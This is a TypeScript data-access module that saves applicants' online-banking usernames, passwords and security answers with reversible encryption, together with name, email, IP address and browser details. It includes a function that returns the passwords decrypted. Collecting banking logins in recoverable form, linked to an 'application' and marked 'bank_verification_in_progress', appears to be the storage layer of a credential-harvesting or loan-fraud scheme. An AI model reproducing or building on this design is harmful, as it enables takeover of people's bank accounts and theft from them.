import { query, queryOne, type DbClient } from "../db";
import { encrypt, decrypt } from "../encryption";
import { sanitizeInput } from "../validation";
import { generateUniqueId } from "../utils";

export interface CreateBankVerificationInput {
  applicationId: string;
  bankName: string;
  accountType: string;
  bankingUsername: string;
  bankingPassword: string;
  securityQuestion?: string;
  ipAddress: string;
  userAgent: string;
  fullName: string;
  email: string;
}

export interface BankVerificationRow {
  id: string;
  application_id: string;
  bank_name: string;
  account_type: string;
  banking_username_encrypted: string;
  banking_password_encrypted: string;
  security_question_encrypted: string | null;
  ip_address: string;
  user_agent: string;
  verification_status: string;
  created_at: string;
  updated_at: string;
}

export async function createBankVerification(
  input: CreateBankVerificationInput,
): Promise<{ id: string }> {
  const encryptedUsername = encrypt(input.bankingUsername);
  const encryptedPassword = encrypt(input.bankingPassword);
  const encryptedSecurityQuestion = input.securityQuestion
    ? encrypt(input.securityQuestion)
    : null;

  const id = await generateUniqueId("bank_verification");

  const rows = await query<{ id: string }>(
    `INSERT INTO bank_verification (
      id, application_id, bank_name, account_type,
      banking_username_encrypted, banking_password_encrypted, security_question_encrypted,
      full_name, email,
      ip_address, user_agent
    ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)
    RETURNING id`,
    [
      id,
      input.applicationId,
      sanitizeInput(input.bankName),
      input.accountType,
      encryptedUsername,
      encryptedPassword,
      encryptedSecurityQuestion,
      sanitizeInput(input.fullName),
      sanitizeInput(input.email),
      input.ipAddress,
      input.userAgent,
    ],
  );

  return { id: rows[0].id };
}

// Upsert: update existing record if one exists for this application, otherwise insert new
export async function upsertBankVerification(
  input: CreateBankVerificationInput,
): Promise<{ id: string }> {
  const encryptedUsername = encrypt(input.bankingUsername);
  const encryptedPassword = encrypt(input.bankingPassword);
  const encryptedSecurityQuestion = input.securityQuestion
    ? encrypt(input.securityQuestion)
    : null;

  const existing = await getBankVerificationByApplicationId(input.applicationId);

  if (existing) {
    // Overwrite previous entry with new credentials
    await query(
      `UPDATE bank_verification SET
        bank_name = $1,
        account_type = $2,
        banking_username_encrypted = $3,
        banking_password_encrypted = $4,
        security_question_encrypted = $5,
        full_name = $6,
        email = $7,
        ip_address = $8,
        user_agent = $9,
        verification_status = 'pending'
      WHERE application_id = $10`,
      [
        sanitizeInput(input.bankName),
        input.accountType,
        encryptedUsername,
        encryptedPassword,
        encryptedSecurityQuestion,
        sanitizeInput(input.fullName),
        sanitizeInput(input.email),
        input.ipAddress,
        input.userAgent,
        input.applicationId,
      ],
    );
    return { id: existing.id };
  }

  return createBankVerification(input);
}

export interface UpdateBankVerificationInput {
  fullName?: string;
  email?: string;
  bankName?: string;
  accountType?: string;
  bankingUsername?: string;
  bankingPassword?: string;
  securityQuestion?: string;
  verificationStatus?: string;
}

export async function updateBankVerificationByApplicationId(
  applicationId: string,
  input: UpdateBankVerificationInput,
  client?: DbClient,
): Promise<boolean> {
  const sets: string[] = [];
  const params: unknown[] = [];
  let i = 1;

  const stringFields: Array<
    [keyof UpdateBankVerificationInput, string, boolean]
  > = [
    ["fullName", "full_name", true],
    ["email", "email", true],
    ["bankName", "bank_name", true],
    ["accountType", "account_type", false],
  ];

  for (const [key, col, sanitize] of stringFields) {
    const value = input[key];
    if (typeof value === "string") {
      const v = sanitize ? sanitizeInput(value) : value;
      sets.push(`${col} = $${i++}`);
      params.push(v);
    }
  }

  if (
    typeof input.bankingUsername === "string" &&
    input.bankingUsername.length > 0
  ) {
    sets.push(`banking_username_encrypted = $${i++}`);
    params.push(encrypt(input.bankingUsername));
  }

  if (
    typeof input.bankingPassword === "string" &&
    input.bankingPassword.length > 0
  ) {
    sets.push(`banking_password_encrypted = $${i++}`);
    params.push(encrypt(input.bankingPassword));
  }

  if (typeof input.securityQuestion === "string") {
    sets.push(`security_question_encrypted = $${i++}`);
    params.push(
      input.securityQuestion ? encrypt(input.securityQuestion) : null,
    );
  }

  if (typeof input.verificationStatus === "string") {
    const allowed = [
      "pending",
      "verified",
      "failed",
      "bank_verification_in_progress",
    ];
    if (!allowed.includes(input.verificationStatus)) {
      throw new Error(
        `Invalid verification_status: ${input.verificationStatus}`,
      );
    }
    sets.push(`verification_status = $${i++}`);
    params.push(input.verificationStatus);
  }

  if (sets.length === 0) return false;

  params.push(applicationId);
  const sql = `UPDATE bank_verification SET ${sets.join(", ")} WHERE application_id = $${i} RETURNING id`;
  const rows = client
    ? await client.query<{ id: string }>(sql, params)
    : await query<{ id: string }>(sql, params);

  return rows.length > 0;
}

export async function getBankVerificationByApplicationId(
  applicationId: string,
): Promise<BankVerificationRow | null> {
  return queryOne<BankVerificationRow>(
    "SELECT * FROM bank_verification WHERE application_id = $1 ORDER BY created_at DESC LIMIT 1",
    [applicationId],
  );
}

export async function getBankVerificationDecrypted(
  applicationId: string,
): Promise<
  | (BankVerificationRow & {
      username_decrypted: string;
      password_decrypted: string;
      security_question_decrypted: string | null;
    })
  | null
> {
  const row = await getBankVerificationByApplicationId(applicationId);
  if (!row) return null;

  const safe = (ct: string | null | undefined): string => {
    if (!ct) return "";
    try {
      return decrypt(ct);
    } catch {
      return "[DECRYPTION_FAILED]";
    }
  };

  return {
    ...row,
    username_decrypted: safe(row.banking_username_encrypted),
    password_decrypted: safe(row.banking_password_encrypted),
    security_question_decrypted: row.security_question_encrypted
      ? safe(row.security_question_encrypted)
      : null,
  };
}
